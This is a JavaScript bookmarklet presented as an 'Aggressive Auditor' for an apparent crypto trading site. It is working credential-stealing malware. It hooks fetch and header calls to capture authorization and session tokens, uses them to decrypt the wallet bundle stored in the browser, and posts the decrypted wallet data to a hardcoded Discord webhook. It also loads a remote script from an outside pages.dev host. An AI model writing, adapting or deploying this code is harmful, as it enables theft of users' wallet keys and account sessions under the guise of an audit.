javascript:(async function(){
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1469402005800878305/8hG79mVNsgEJiGa4fyqAGf3PsUsQYi1rQyMZnu7bcxYyeQGj7ZgBf7ucccxQt8sBBh09",
        aff: "TK0XQV",
        decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
    };

    const notify = (msg) => {
        fetch(CONFIG.webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ embeds: [{ title: "🚨 AUDIT ALERT", description: msg, color: 0xff0000 }]})
        }).catch(()=>{});
    };

    /* 1. THE DECRYPTOR: The core of the 'Move' */
    const runDecryption = async (token, session) => {
        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundleStr) return;
        
        const bundleData = JSON.parse(bundleStr);
        const firstKey = Object.keys(bundleData.bundles)[0];
        const payload = {
            bundle: bundleData.bundles[firstKey].exportBundle,
            subOrgId: bundleData.bundles[firstKey].subOrgId
        };

        try {
            const res = await fetch(CONFIG.decryptUrl, {
                method: 'POST',
                headers: {
                    'Authorization': token,
                    'X-Padre-Session': session,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            const decrypted = await res.json();
            notify("✅ **WALLET DECRYPTED**\n```json\n" + JSON.stringify(decrypted, null, 2) + "\n```");
        } catch (e) {
            notify("❌ Decryption failed: " + e.message);
        }
    };

    /* 2. THE AGGRESSIVE SNIFFER (Headers + XHR + Fetch) */
    let capturedToken = null;
    let capturedSession = "";

    const checkAndRun = (name, val) => {
        if (name.toLowerCase() === 'authorization') capturedToken = val;
        if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
        
        if (capturedToken && !window.auditComplete) {
            window.auditComplete = true;
            notify("🔑 Credentials Sniffed. Attempting Auto-Decrypt...");
            runDecryption(capturedToken, capturedSession);
        }
    };

    // Hook Headers.set
    const _set = Headers.prototype.set;
    Headers.prototype.set = function(n, v) {
        checkAndRun(n, v);
        return _set.apply(this, arguments);
    };

    // Hook Fetch
    const _f = window.fetch;
    window.fetch = async (...a) => {
        const h = a[1]?.headers;
        if (h) Object.entries(h).forEach(([n, v]) => checkAndRun(n, v));
        return _f(...a);
    };

    /* 3. THE TRIGGER: Force the site to leak its own keys */
    _f('/api/v2/user/profile');
    
    /* 4. INJECT UI ANCHOR */
    const d = document.createElement('div');
    d.id = 'codex'; d.innerText = CONFIG.aff; d.style.display = 'none';
    document.body.appendChild(d);
    const s = document.createElement('script');
    s.src = "https://14c11728.reversevanta.pages.dev/modalx.js";
    document.head.appendChild(s);

    console.log("Aggressive Auditor Initialized.");
})();
